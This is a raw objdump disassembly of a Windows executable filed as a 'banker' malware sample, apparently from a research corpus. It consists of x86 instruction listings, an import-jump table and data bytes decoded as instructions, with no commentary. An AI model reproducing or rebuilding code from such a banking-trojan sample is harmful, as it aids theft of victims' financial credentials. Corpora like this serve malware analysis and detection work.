
malware_samples/banker/3d9c975f79b08957f18c83aead4d31e37ee1939046f9f7b946ef8516293aa1f2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	41                   	inc    %ecx
  401001:	98                   	cwtl
  401002:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401003:	72 86                	jb     0x400f8b
  401005:	93                   	xchg   %eax,%ebx
  401006:	a3 72 f9 09 a3       	mov    %eax,0xa309f972
  40100b:	72 ee                	jb     0x400ffb
  40100d:	6a a4                	push   $0xffffffa4
  40100f:	72 37                	jb     0x401048
  401011:	05 a2 72 8d 72       	add    $0x728d72a2,%eax
  401016:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401017:	72 44                	jb     0x40105d
  401019:	c2 a0 72             	ret    $0x72a0
  40101c:	31 68 a4             	xor    %ebp,-0x5c(%eax)
  40101f:	72 29                	jb     0x40104a
  401021:	19 a2 72 9b 6a a2    	sbb    %esp,-0x5d95648e(%edx)
  401027:	72 62                	jb     0x40108b
  401029:	72 a4                	jb     0x400fcf
  40102b:	72 ba                	jb     0x400fe7
  40102d:	02 a3 72 b7 70 a2    	add    -0x5d8f488e(%ebx),%ah
  401033:	72 41                	jb     0x401076
  401035:	09 a3 72 e1 49 a2    	or     %esp,-0x5db61e8e(%ebx)
  40103b:	72 76                	jb     0x4010b3
  40103d:	6a a2                	push   $0xffffffa2
  40103f:	72 3a                	jb     0x40107b
  401041:	c3                   	ret
  401042:	a0 72 74 a2 a1       	mov    0xa1a27472,%al
  401047:	72 6e                	jb     0x4010b7
  401049:	02 a3 72 40 39 a4    	add    -0x5bc6bf8e(%ebx),%ah
  40104f:	72 fe                	jb     0x40104f
  401051:	c1 a1 72 48 4a a2 72 	shll   $0x72,-0x5db5b78e(%ecx)
  401058:	9d                   	popf
  401059:	49                   	dec    %ecx
  40105a:	a2 72 32 d1 a1       	mov    %al,0xa1d13272
  40105f:	72 f1                	jb     0x401052
  401061:	9f                   	lahf
  401062:	a1 72 06 03 a3       	mov    0xa3030672,%eax
  401067:	72 08                	jb     0x401071
  401069:	a0 a1 72 06 04       	mov    0x40672a1,%al
  40106e:	a3 72 21 76 a2       	mov    %eax,0xa2762172
  401073:	72 85                	jb     0x400ffa
  401075:	71 a4                	jno    0x40101b
  401077:	72 ee                	jb     0x401067
  401079:	94                   	xchg   %eax,%esp
  40107a:	a3 72 e2 6f a2       	mov    %eax,0xa26fe272
  40107f:	72 b9                	jb     0x40103a
  401081:	7d a2                	jge    0x401025
  401083:	72 ea                	jb     0x40106f
  401085:	62 a3 72 7d 41 a1    	bound  %esp,-0x5ebe828e(%ebx)
  40108b:	72 74                	jb     0x401101
  40108d:	9b                   	fwait
  40108e:	a0 72 10 c4 a1       	mov    0xa1c41072,%al
  401093:	72 de                	jb     0x401073
  401095:	56                   	push   %esi
  401096:	a2 72 ae c6 a1       	mov    %al,0xa1c6ae72
  40109b:	72 f6                	jb     0x401093
  40109d:	97                   	xchg   %eax,%edi
  40109e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40109f:	72 a9                	jb     0x40104a
  4010a1:	a1 a1 72 fd a0       	mov    0xa0fd72a1,%eax
  4010a6:	94                   	xchg   %eax,%esp
  4010a7:	72 c7                	jb     0x401070
  4010a9:	8d a4 72 28 c6 a1 72 	lea    0x72a1c628(%edx,%esi,2),%esp
  4010b0:	f6 09 a3             	testb  $0xa3,(%ecx)
  4010b3:	72 0a                	jb     0x4010bf
  4010b5:	c3                   	ret
  4010b6:	a1 72 87 9b a0       	mov    0xa09b8772,%eax
  4010bb:	72 dc                	jb     0x401099
  4010bd:	19 a2 72 93 95 a3    	sbb    %esp,-0x5c6a6c8e(%edx)
  4010c3:	72 c8                	jb     0x40108d
  4010c5:	96                   	xchg   %eax,%esi
  4010c6:	a1 72 85 9a a0       	mov    0xa09a8572,%eax
  4010cb:	72 f2                	jb     0x4010bf
  4010cd:	19 a2 72 d4 04 a2    	sbb    %esp,-0x5dfb2b8e(%edx)
  4010d3:	72 df                	jb     0x4010b4
  4010d5:	47                   	inc    %edi
  4010d6:	a2 72 db 7d a3       	mov    %al,0xa37ddb72
  4010db:	72 58                	jb     0x401135
  4010dd:	3c a1                	cmp    $0xa1,%al
  4010df:	72 a3                	jb     0x401084
  4010e1:	50                   	push   %eax
  4010e2:	a1 72 71 89 a3       	mov    0xa3897172,%eax
  4010e7:	72 89                	jb     0x401072
  4010e9:	06                   	push   %es
  4010ea:	a3 72 ba 03 a3       	mov    %eax,0xa303ba72
  4010ef:	72 89                	jb     0x40107a
  4010f1:	5c                   	pop    %esp
  4010f2:	a1 72 13 75 a4       	mov    0xa4751372,%eax
  4010f7:	72 e9                	jb     0x4010e2
  4010f9:	8f                   	(bad)
  4010fa:	a2 72 5a c6 a1       	mov    %al,0xa1c65a72
  4010ff:	72 48                	jb     0x401149
  401101:	19 a2 72 7d 69 a2    	sbb    %esp,-0x5d96828e(%edx)
  401107:	72 be                	jb     0x4010c7
  401109:	0e                   	push   %cs
  40110a:	a2 72 2b 94 a3       	mov    %al,0xa3942b72
  40110f:	72 67                	jb     0x401178
  401111:	e8 a0 72 10 3d       	call   0x3d5083b6
  401116:	a1 72 18 56 a2       	mov    0xa2561872,%eax
  40111b:	72 ec                	jb     0x401109
  40111d:	3a a4 72 a8 8d a4 72 	cmp    0x72a48da8(%edx,%esi,2),%ah
  401124:	37                   	aaa
  401125:	a2 a1 72 3a 03       	mov    %al,0x33a72a1
  40112a:	a3 72 3a 04 a3       	mov    %eax,0xa3043a72
  40112f:	72 4a                	jb     0x40117b
  401131:	6c                   	insb   (%dx),%es:(%edi)
  401132:	a2 72 5e 10 a2       	mov    %al,0xa2105e72
  401137:	72 01                	jb     0x40113a
  401139:	6c                   	insb   (%dx),%es:(%edi)
  40113a:	a2 72 64 95 a4       	mov    %al,0xa4956472
  40113f:	72 6e                	jb     0x4011af
  401141:	03 a3 72 a9 fd a2    	add    -0x5d02568e(%ebx),%esp
  401147:	72 7d                	jb     0x4011c6
  401149:	ef                   	out    %eax,(%dx)
  40114a:	a1 72 a4 35 94       	mov    0x9435a472,%eax
  40114f:	72 c7                	jb     0x401118
  401151:	a0 a1 72 2f 4e       	mov    0x4e2f72a1,%al
  401156:	a2 72 22 99 a4       	mov    %al,0xa4992272
  40115b:	72 d9                	jb     0x401136
  40115d:	c6                   	(bad)
  40115e:	a1 72 b8 8c a4       	mov    0xa48cb872,%eax
  401163:	72 c1                	jb     0x401126
  401165:	77 a4                	ja     0x40110b
  401167:	72 f6                	jb     0x40115f
  401169:	6d                   	insl   (%dx),%es:(%edi)
  40116a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40116b:	72 b8                	jb     0x401125
  40116d:	6b a4 72 8c 8d a4 72 	imul   $0xffffffdf,0x72a48d8c(%edx,%esi,2),%esp
  401174:	df 
  401175:	a1 a1 72 49 a0       	mov    0xa04972a1,%eax
  40117a:	a1 72 c0 92 a3       	mov    0xa392c072,%eax
  40117f:	72 0d                	jb     0x40118e
  401181:	c2 a0 72             	ret    $0x72a0
  401184:	30 6c a2 72          	xor    %ch,0x72(%edx,%eiz,4)
  401188:	46                   	inc    %esi
  401189:	06                   	push   %es
  40118a:	a2 72 ed ee a2       	mov    %al,0xa2eeed72
  40118f:	72 e2                	jb     0x401173
  401191:	8d a4 72 44 96 a3 72 	lea    0x72a39644(%edx,%esi,2),%esp
  401198:	fc                   	cld
  401199:	c6                   	(bad)
  40119a:	a1 72 11 dd a2       	mov    0xa2dd1172,%eax
  40119f:	72 ec                	jb     0x40118d
  4011a1:	6b a2 72 af 9f a1 72 	imul   $0x72,-0x5e60508e(%edx),%esp
  4011a8:	5a                   	pop    %edx
  4011a9:	32 a1 72 00 00 00    	xor    0x72(%ecx),%ah
  4011af:	00 05 00 08 00 81    	add    %al,0x81000800
  4011b5:	43                   	inc    %ebx
  4011b6:	40                   	inc    %eax
  4011b7:	00 00                	add    %al,(%eax)
  4011b9:	00 00                	add    %al,(%eax)
  4011bb:	00 88 43 40 00 0e    	add    %cl,0xe004043(%eax)
  4011c1:	00 08                	add    %cl,(%eax)
  4011c3:	00 00                	add    %al,(%eax)
  4011c5:	00 00                	add    %al,(%eax)
  4011c7:	00 16                	add    %dl,(%esi)
  4011c9:	46                   	inc    %esi
  4011ca:	40                   	inc    %eax
  4011cb:	00 fc                	add    %bh,%ah
  4011cd:	45                   	inc    %ebp
  4011ce:	40                   	inc    %eax
  4011cf:	00 02                	add    %al,(%edx)
  4011d1:	00 04 00             	add    %al,(%eax,%eax,1)
  4011d4:	00 00                	add    %al,(%eax)
  4011d6:	00 00                	add    %al,(%eax)
  4011d8:	8f 47 40             	pop    0x40(%edi)
  4011db:	00 00                	add    %al,(%eax)
  4011dd:	00 00                	add    %al,(%eax)
  4011df:	00 26                	add    %ah,(%esi)
  4011e1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4011e4:	00 00                	add    %al,(%eax)
  4011e6:	00 00                	add    %al,(%eax)
  4011e8:	47                   	inc    %edi
  4011e9:	4a                   	dec    %edx
  4011ea:	40                   	inc    %eax
  4011eb:	00 1e                	add    %bl,(%esi)
  4011ed:	4a                   	dec    %edx
  4011ee:	40                   	inc    %eax
  4011ef:	00 00                	add    %al,(%eax)
  4011f1:	00 00                	add    %al,(%eax)
  4011f3:	00 f8                	add    %bh,%al
  4011f5:	11 40 00             	adc    %eax,0x0(%eax)
  4011f8:	0a 00                	or     (%eax),%al
  4011fa:	00 00                	add    %al,(%eax)
  4011fc:	fe 47 40             	incb   0x40(%edi)
  4011ff:	00 05 48 40 00 14    	add    %al,0x14004048
  401205:	48                   	dec    %eax
  401206:	40                   	inc    %eax
  401207:	00 44 48 40          	add    %al,0x40(%eax,%ecx,2)
  40120b:	00 65 48             	add    %ah,0x48(%ebp)
  40120e:	40                   	inc    %eax
  40120f:	00 7a 48             	add    %bh,0x48(%edx)
  401212:	40                   	inc    %eax
  401213:	00 89 48 40 00 18    	add    %cl,0x18004048(%ecx)
  401219:	49                   	dec    %ecx
  40121a:	40                   	inc    %eax
  40121b:	00 f6                	add    %dh,%dh
  40121d:	49                   	dec    %ecx
  40121e:	40                   	inc    %eax
  40121f:	00 17                	add    %dl,(%edi)
  401221:	4a                   	dec    %edx
  401222:	40                   	inc    %eax
  401223:	00 00                	add    %al,(%eax)
  401225:	00 00                	add    %al,(%eax)
  401227:	00 0e                	add    %cl,(%esi)
  401229:	00 08                	add    %cl,(%eax)
  40122b:	00 00                	add    %al,(%eax)
  40122d:	00 00                	add    %al,(%eax)
  40122f:	00 a1 4b 40 00 7c    	add    %ah,0x7c00404b(%ecx)
  401235:	4b                   	dec    %ebx
  401236:	40                   	inc    %eax
  401237:	00 06                	add    %al,(%esi)
  401239:	00 04 00             	add    %al,(%eax,%eax,1)
  40123c:	00 00                	add    %al,(%eax)
  40123e:	00 00                	add    %al,(%eax)
  401240:	26 56                	es push %esi
  401242:	40                   	inc    %eax
  401243:	00 dd                	add    %bl,%ch
  401245:	55                   	push   %ebp
  401246:	40                   	inc    %eax
  401247:	00 0e                	add    %cl,(%esi)
  401249:	00 08                	add    %cl,(%eax)
  40124b:	00 00                	add    %al,(%eax)
  40124d:	00 00                	add    %al,(%eax)
  40124f:	00 eb                	add    %ch,%bl
  401251:	63 40 00             	arpl   %eax,0x0(%eax)
  401254:	d1 63 40             	shll   $1,0x40(%ebx)
	...
  40125f:	00 ff                	add    %bh,%bh
  401261:	25 84 10 40 00       	and    $0x401084,%eax
  401266:	ff 25 d4 10 40 00    	jmp    *0x4010d4
  40126c:	ff 25 f4 10 40 00    	jmp    *0x4010f4
  401272:	ff 25 64 10 40 00    	jmp    *0x401064
  401278:	ff 25 48 10 40 00    	jmp    *0x401048
  40127e:	ff 25 28 11 40 00    	jmp    *0x401128
  401284:	ff 25 2c 10 40 00    	jmp    *0x40102c
  40128a:	ff 25 44 11 40 00    	jmp    *0x401144
  401290:	ff 25 6c 10 40 00    	jmp    *0x40106c
  401296:	ff 25 40 11 40 00    	jmp    *0x401140
  40129c:	ff 25 2c 11 40 00    	jmp    *0x40112c
  4012a2:	ff 25 ec 10 40 00    	jmp    *0x4010ec
  4012a8:	ff 25 b0 10 40 00    	jmp    *0x4010b0
  4012ae:	ff 25 e8 10 40 00    	jmp    *0x4010e8
  4012b4:	ff 25 34 10 40 00    	jmp    *0x401034
  4012ba:	ff 25 08 10 40 00    	jmp    *0x401008
  4012c0:	ff 25 7c 11 40 00    	jmp    *0x40117c
  4012c6:	ff 25 04 10 40 00    	jmp    *0x401004
  4012cc:	ff 25 9c 11 40 00    	jmp    *0x40119c
  4012d2:	ff 25 0c 11 40 00    	jmp    *0x40110c
  4012d8:	ff 25 78 10 40 00    	jmp    *0x401078
  4012de:	ff 25 c0 10 40 00    	jmp    *0x4010c0
  4012e4:	ff 25 94 11 40 00    	jmp    *0x401194
  4012ea:	ff 25 8c 11 40 00    	jmp    *0x40118c
  4012f0:	ff 25 a4 11 40 00    	jmp    *0x4011a4
  4012f6:	ff 25 44 10 40 00    	jmp    *0x401044
  4012fc:	ff 25 68 10 40 00    	jmp    *0x401068
  401302:	ff 25 24 11 40 00    	jmp    *0x401124
  401308:	ff 25 00 10 40 00    	jmp    *0x401000
  40130e:	ff 25 54 10 40 00    	jmp    *0x401054
  401314:	ff 25 38 10 40 00    	jmp    *0x401038
  40131a:	ff 25 48 11 40 00    	jmp    *0x401148
  401320:	ff 25 60 10 40 00    	jmp    *0x401060
  401326:	ff 25 64 11 40 00    	jmp    *0x401164
  40132c:	ff 25 54 11 40 00    	jmp    *0x401154
  401332:	ff 25 9c 10 40 00    	jmp    *0x40109c
  401338:	ff 25 10 10 40 00    	jmp    *0x401010
  40133e:	ff 25 5c 10 40 00    	jmp    *0x40105c
  401344:	ff 25 24 10 40 00    	jmp    *0x401024
  40134a:	ff 25 74 11 40 00    	jmp    *0x401174
  401350:	ff 25 c4 10 40 00    	jmp    *0x4010c4
  401356:	ff 25 10 11 40 00    	jmp    *0x401110
  40135c:	ff 25 78 11 40 00    	jmp    *0x401178
  401362:	ff 25 14 10 40 00    	jmp    *0x401014
  401368:	ff 25 90 11 40 00    	jmp    *0x401190
  40136e:	ff 25 d0 10 40 00    	jmp    *0x4010d0
  401374:	ff 25 58 11 40 00    	jmp    *0x401158
  40137a:	ff 25 bc 10 40 00    	jmp    *0x4010bc
  401380:	ff 25 50 11 40 00    	jmp    *0x401150
  401386:	ff 25 3c 11 40 00    	jmp    *0x40113c
  40138c:	ff 25 74 10 40 00    	jmp    *0x401074
  401392:	ff 25 20 11 40 00    	jmp    *0x401120
  401398:	ff 25 a0 10 40 00    	jmp    *0x4010a0
  40139e:	ff 25 60 11 40 00    	jmp    *0x401160
  4013a4:	ff 25 f0 10 40 00    	jmp    *0x4010f0
  4013aa:	ff 25 68 11 40 00    	jmp    *0x401168
  4013b0:	ff 25 a8 10 40 00    	jmp    *0x4010a8
  4013b6:	ff 25 28 10 40 00    	jmp    *0x401028
  4013bc:	ff 25 70 11 40 00    	jmp    *0x401170
  4013c2:	ff 25 04 11 40 00    	jmp    *0x401104
  4013c8:	ff 25 e0 10 40 00    	jmp    *0x4010e0
  4013ce:	ff 25 30 11 40 00    	jmp    *0x401130
  4013d4:	ff 25 6c 11 40 00    	jmp    *0x40116c
  4013da:	ff 25 a0 11 40 00    	jmp    *0x4011a0
  4013e0:	ff 25 00 11 40 00    	jmp    *0x401100
  4013e6:	ff 25 a8 11 40 00    	jmp    *0x4011a8
  4013ec:	ff 25 1c 10 40 00    	jmp    *0x40101c
  4013f2:	ff 25 20 10 40 00    	jmp    *0x401020
  4013f8:	ff 25 70 10 40 00    	jmp    *0x401070
  4013fe:	ff 25 0c 10 40 00    	jmp    *0x40100c
  401404:	ff 25 88 10 40 00    	jmp    *0x401088
  40140a:	ff 25 dc 10 40 00    	jmp    *0x4010dc
  401410:	ff 25 38 11 40 00    	jmp    *0x401138
  401416:	ff 25 3c 10 40 00    	jmp    *0x40103c
  40141c:	ff 25 84 11 40 00    	jmp    *0x401184
  401422:	ff 25 14 11 40 00    	jmp    *0x401114
  401428:	ff 25 58 10 40 00    	jmp    *0x401058
  40142e:	ff 25 a4 10 40 00    	jmp    *0x4010a4
  401434:	ff 25 50 10 40 00    	jmp    *0x401050
  40143a:	ff 25 88 11 40 00    	jmp    *0x401188
  401440:	ff 25 98 11 40 00    	jmp    *0x401198
  401446:	ff 25 5c 11 40 00    	jmp    *0x40115c
  40144c:	ff 25 b4 10 40 00    	jmp    *0x4010b4
  401452:	ff 25 40 10 40 00    	jmp    *0x401040
  401458:	ff 25 90 10 40 00    	jmp    *0x401090
  40145e:	ff 25 98 10 40 00    	jmp    *0x401098
  401464:	ff 25 cc 10 40 00    	jmp    *0x4010cc
  40146a:	ff 25 7c 10 40 00    	jmp    *0x40107c
  401470:	ff 25 30 10 40 00    	jmp    *0x401030
  401476:	ff 25 08 11 40 00    	jmp    *0x401108
  40147c:	ff 25 34 11 40 00    	jmp    *0x401134
  401482:	ff 25 fc 10 40 00    	jmp    *0x4010fc
  401488:	ff 25 ac 10 40 00    	jmp    *0x4010ac
  40148e:	ff 25 f8 10 40 00    	jmp    *0x4010f8
  401494:	ff 25 1c 11 40 00    	jmp    *0x40111c
  40149a:	ff 25 18 10 40 00    	jmp    *0x401018
  4014a0:	ff 25 d8 10 40 00    	jmp    *0x4010d8
  4014a6:	ff 25 4c 10 40 00    	jmp    *0x40104c
  4014ac:	ff 25 80 11 40 00    	jmp    *0x401180
  4014b2:	ff 25 e4 10 40 00    	jmp    *0x4010e4
  4014b8:	ff 25 94 10 40 00    	jmp    *0x401094
  4014be:	ff 25 18 11 40 00    	jmp    *0x401118
  4014c4:	ff 25 80 10 40 00    	jmp    *0x401080
  4014ca:	ff 25 c8 10 40 00    	jmp    *0x4010c8
  4014d0:	ff 25 8c 10 40 00    	jmp    *0x40108c
  4014d6:	ff 25 b8 10 40 00    	jmp    *0x4010b8
  4014dc:	ff 25 4c 11 40 00    	jmp    *0x40114c
  4014e2:	00 00                	add    %al,(%eax)
  4014e4:	68 f4 2d 40 00       	push   $0x402df4
  4014e9:	e8 ee ff ff ff       	call   0x4014dc
  4014ee:	00 00                	add    %al,(%eax)
  4014f0:	00 00                	add    %al,(%eax)
  4014f2:	00 00                	add    %al,(%eax)
  4014f4:	30 00                	xor    %al,(%eax)
  4014f6:	00 00                	add    %al,(%eax)
  4014f8:	40                   	inc    %eax
  4014f9:	00 00                	add    %al,(%eax)
  4014fb:	00 00                	add    %al,(%eax)
  4014fd:	00 00                	add    %al,(%eax)
  4014ff:	00 37                	add    %dh,(%edi)
  401501:	96                   	xchg   %eax,%esi
  401502:	91                   	xchg   %eax,%ecx
  401503:	4d                   	dec    %ebp
  401504:	79 8e                	jns    0x401494
  401506:	7f 46                	jg     0x40154e
  401508:	86 91 e7 1c 64 be    	xchg   %dl,-0x419be319(%ecx)
  40150e:	98                   	cwtl
  40150f:	04 00                	add    $0x0,%al
  401511:	00 00                	add    %al,(%eax)
  401513:	00 00                	add    %al,(%eax)
  401515:	00 01                	add    %al,(%ecx)
	...
  40151f:	00 44 65 61          	add    %al,0x61(%ebp,%eiz,2)
  401523:	6c                   	insb   (%dx),%es:(%edi)
  401524:	61                   	popa
  401525:	68 6f 79 61 00       	push   $0x61796f
	...
  401532:	00 00                	add    %al,(%eax)
  401534:	ff cc                	dec    %esp
  401536:	31 00                	xor    %eax,(%eax)
  401538:	00 4b 1a             	add    %cl,0x1a(%ebx)
  40153b:	98                   	cwtl
  40153c:	c6                   	(bad)
  40153d:	52                   	push   %edx
  40153e:	71 e2                	jno    0x401522
  401540:	4c                   	dec    %esp
  401541:	9e                   	sahf
  401542:	eb 83                	jmp    0x4014c7
  401544:	11 a3 e1 47 9c 9b    	adc    %esp,-0x6463b81f(%ebx)
  40154a:	06                   	push   %es
  40154b:	16                   	push   %ss
  40154c:	82 89 80 b0 4b b1 d0 	orb    $0xd0,-0x4eb44f80(%ecx)
  401553:	02 c2                	add    %dl,%al
  401555:	52                   	push   %edx
  401556:	b3 54                	mov    $0x54,%bl
  401558:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401559:	72 4f                	jb     0x4015aa
  40155b:	ad                   	lods   %ds:(%esi),%eax
  40155c:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  401562:	0c 00                	or     $0x0,%al
  401564:	aa                   	stos   %al,%es:(%edi)
  401565:	00 60 d3             	add    %ah,-0x2d(%eax)
  401568:	93                   	xchg   %eax,%ebx
	...
  40158d:	94                   	xchg   %eax,%esp
  40158e:	16                   	push   %ss
  40158f:	00 00                	add    %al,(%eax)
  401591:	8f                   	(bad)
  401592:	16                   	push   %ss
  401593:	00 00                	add    %al,(%eax)
  401595:	00 09                	add    %cl,(%ecx)
  401597:	00 64 52 65          	add    %ah,0x65(%edx,%edx,2)
  40159b:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40159e:	6d                   	insl   (%dx),%es:(%edi)
  40159f:	65 64 00 14 01       	gs add %dl,%fs:(%ecx,%eax,1)
  4015a4:	09 00                	or     %eax,(%eax)
  4015a6:	64 52                	fs push %edx
  4015a8:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  4015ac:	6d                   	insl   (%dx),%es:(%edi)
  4015ad:	65 64 00 03          	gs add %al,%fs:(%ebx)
  4015b1:	0c 00                	or     $0x0,%al
  4015b3:	00 80 23 46 16 00    	add    %al,0x164623(%eax)
  4015b9:	00 6c 74 00          	add    %ch,0x0(%esp,%esi,2)
  4015bd:	00 3e                	add    %bh,(%esi)
  4015bf:	16                   	push   %ss
  4015c0:	00 00                	add    %al,(%eax)
  4015c2:	00 00                	add    %al,(%eax)
  4015c4:	01 00                	add    %eax,(%eax)
  4015c6:	01 00                	add    %eax,(%eax)
  4015c8:	40                   	inc    %eax
  4015c9:	40                   	inc    %eax
  4015ca:	00 00                	add    %al,(%eax)
  4015cc:	01 00                	add    %eax,(%eax)
  4015ce:	08 00                	or     %al,(%eax)
  4015d0:	28 16                	sub    %dl,(%esi)
  4015d2:	00 00                	add    %al,(%eax)
  4015d4:	16                   	push   %ss
  4015d5:	00 00                	add    %al,(%eax)
  4015d7:	00 28                	add    %ch,(%eax)
  4015d9:	00 00                	add    %al,(%eax)
  4015db:	00 40 00             	add    %al,0x0(%eax)
  4015de:	00 00                	add    %al,(%eax)
  4015e0:	80 00 00             	addb   $0x0,(%eax)
  4015e3:	00 01                	add    %al,(%ecx)
  4015e5:	00 08                	add    %cl,(%eax)
  4015e7:	00 00                	add    %al,(%eax)
  4015e9:	00 00                	add    %al,(%eax)
  4015eb:	00 00                	add    %al,(%eax)
  4015ed:	12 00                	adc    (%eax),%al
	...
  4015f7:	00 00                	add    %al,(%eax)
  4015f9:	01 00                	add    %eax,(%eax)
	...
  401603:	00 a4 9c 84 00 84 70 	add    %ah,0x70840084(%esp,%ebx,4)
  40160a:	3c 00                	cmp    $0x0,%al
  40160c:	48                   	dec    %eax
  40160d:	48                   	dec    %eax
  40160e:	48                   	dec    %eax
  40160f:	00 d4                	add    %dl,%ah
  401611:	d4 cc                	aam    $0xcc
  401613:	00 44 3c 1c          	add    %al,0x1c(%esp,%edi,1)
  401617:	00 e8                	add    %ch,%al
  401619:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40161a:	1c 00                	sbb    $0x0,%al
  40161c:	c4 b0 74 00 ec cc    	les    -0x3313ff8c(%eax),%esi
  401622:	84 00                	test   %al,(%eax)
  401624:	84 7c 68 00          	test   %bh,0x0(%eax,%ebp,2)
  401628:	24 1c                	and    $0x1c,%al
  40162a:	0c 00                	or     $0x0,%al
  40162c:	a0 a0 a0 00 d8       	mov    0xd800a0a0,%al
  401631:	c0 80 00 74 70 64 00 	rolb   $0x0,0x64707400(%eax)
  401638:	e0 e0                	loopne 0x40161a
  40163a:	e0 00                	loopne 0x40163c
  40163c:	cc                   	int3
  40163d:	cc                   	int3
  40163e:	b8 00 68 58 40       	mov    $0x40586800,%eax
  401643:	00 68 50             	add    %ch,0x50(%eax)
  401646:	20 00                	and    %al,(%eax)
  401648:	c0 a0 48 00 e0 b8 58 	shlb   $0x58,-0x471fffb8(%eax)
  40164f:	00 f4                	add    %dh,%ah
  401651:	dc a4 00 ec ac 3c 00 	fsubl  0x3cacec(%eax,%eax,1)
  401658:	98                   	cwtl
  401659:	88 54 00 e8          	mov    %dl,-0x18(%eax,%eax,1)
  40165d:	e8 c8 00 f8 e0       	call   0xe138172a
  401662:	c0 00 a8             	rolb   $0xa8,(%eax)
  401665:	98                   	cwtl
  401666:	64 00 b8 b0 a8 00 f0 	add    %bh,%fs:-0xfff5750(%eax)
  40166d:	c4 6c 00 44          	les    0x44(%eax,%eax,1),%ebp
  401671:	3c 30                	cmp    $0x30,%al
  401673:	00 f8                	add    %bh,%al
  401675:	e4 94                	in     $0x94,%al
  401677:	00 2c 28             	add    %ch,(%eax,%ebp,1)
  40167a:	24 00                	and    $0x0,%al
  40167c:	18 10                	sbb    %dl,(%eax)
  40167e:	04 00                	add    $0x0,%al
  401680:	a8 a4                	test   $0xa4,%al
  401682:	94                   	xchg   %eax,%esp
  401683:	00 90 7c 4c 00 58    	add    %dl,0x58004c7c(%eax)
  401689:	50                   	push   %eax
  40168a:	28 00                	sub    %al,(%eax)
  40168c:	ec                   	in     (%dx),%al
  40168d:	ac                   	lods   %ds:(%esi),%al
  40168e:	2c 00                	sub    $0x0,%al
  401690:	d4 bc                	aam    $0xbc
  401692:	74 00                	je     0x401694
  401694:	ec                   	in     (%dx),%al
  401695:	d4 94                	aam    $0x94
  401697:	00 84 7c 74 00 98 88 	add    %al,-0x7767ff8c(%esp,%edi,2)
  40169e:	60                   	pusha
  40169f:	00 34 2c             	add    %dh,(%esp,%ebp,1)
  4016a2:	0c 00                	or     $0x0,%al
  4016a4:	c0 b8 98 00 78 78 78 	sarb   $0x78,0x78780098(%eax)
  4016ab:	00 f4                	add    %dh,%ah
  4016ad:	f4                   	hlt
  4016ae:	f4                   	hlt
  4016af:	00 f4                	add    %dh,%ah
  4016b1:	f4                   	hlt
  4016b2:	e4 00                	in     $0x0,%al
  4016b4:	74 68                	je     0x40171e
  4016b6:	54                   	push   %esp
  4016b7:	00 70 60             	add    %dh,0x60(%eax)
  4016ba:	38 00                	cmp    %al,(%eax)
  4016bc:	f8                   	clc
  4016bd:	e4 b4                	in     $0xb4,%al
  4016bf:	00 f0                	add    %dh,%al
  4016c1:	b8 3c 00 ec e8       	mov    $0xe8ec003c,%eax
  4016c6:	d4 00                	aam    $0x0
  4016c8:	a8 a0                	test   $0xa0,%al
  4016ca:	78 00                	js     0x4016cc
  4016cc:	a8 a8                	test   $0xa8,%al
  4016ce:	88 00                	mov    %al,(%eax)
  4016d0:	e0 d8                	loopne 0x4016aa
  4016d2:	c8 00 f4 d8          	enter  $0xf400,$0xd8
  4016d6:	84 00                	test   %al,(%eax)
  4016d8:	30 20                	xor    %ah,(%eax)
  4016da:	08 00                	or     %al,(%eax)
  4016dc:	b0 b0                	mov    $0xb0,%al
  4016de:	a0 00 f0 c4 60       	mov    0x60c4f000,%al
  4016e3:	00 f0                	add    %dh,%al
  4016e5:	c8 58 00 f0          	enter  $0x58,$0xf0
  4016e9:	bc 54 00 f8 e8       	mov    $0xe8f80054,%esp
  4016ee:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4016ef:	00 f0                	add    %dh,%al
  4016f1:	b0 48                	mov    $0x48,%al
  4016f3:	00 a8 98 58 00 a8    	add    %ch,-0x57ffa768(%eax)
  4016f9:	90                   	nop
  4016fa:	58                   	pop    %eax
  4016fb:	00 f8                	add    %bh,%al
  4016fd:	ec                   	in     (%dx),%al
  4016fe:	c4 00                	les    (%eax),%eax
  401700:	c8 c0 b8 00          	enter  $0xb8c0,$0x0
  401704:	f0 cc                	lock int3
  401706:	78 00                	js     0x401708
  401708:	f0 d0 6c 00 48       	lock shrb $1,0x48(%eax,%eax,1)
  40170d:	48                   	dec    %eax
  40170e:	38 00                	cmp    %al,(%eax)
  401710:	38 30                	cmp    %dh,(%eax)
  401712:	20 00                	and    %al,(%eax)
  401714:	f8                   	clc
  401715:	d4 94                	aam    $0x94
  401717:	00 f8                	add    %bh,%al
  401719:	f0 b8 00 ec bc 48    	lock mov $0x48bcec00,%eax
  40171f:	00 f8                	add    %bh,%al
  401721:	f8                   	clc
  401722:	d4 00                	aam    $0x0
  401724:	f8                   	clc
  401725:	ec                   	in     (%dx),%al
  401726:	d4 00                	aam    $0x0
	...
  4019fc:	ff                   	(bad)
  4019fd:	ff                   	(bad)
  4019fe:	ff 00                	incl   (%eax)
	...
  401b08:	00 00                	add    %al,(%eax)
  401b0a:	0a 22                	or     (%edx),%ah
  401b0c:	21 16                	and    %edx,(%esi)
  401b0e:	16                   	push   %ss
  401b0f:	16                   	push   %ss
  401b10:	16                   	push   %ss
  401b11:	3e 16                	ds push %ss
  401b13:	3e 16                	ds push %ss
  401b15:	19 16                	sbb    %edx,(%esi)
  401b17:	19 27                	sbb    %esp,(%edi)
  401b19:	3e 19 16             	sbb    %edx,%ds:(%esi)
  401b1c:	19 3e                	sbb    %edi,(%esi)
  401b1e:	19 27                	sbb    %esp,(%edi)
  401b20:	19 3e                	sbb    %edi,(%esi)
  401b22:	19 27                	sbb    %esp,(%edi)
  401b24:	19 27                	sbb    %esp,(%edi)
  401b26:	3e 19 16             	sbb    %edx,%ds:(%esi)
  401b29:	19 16                	sbb    %edx,(%esi)
  401b2b:	19 27                	sbb    %esp,(%edi)
  401b2d:	3e 16                	ds push %ss
  401b2f:	3e 16                	ds push %ss
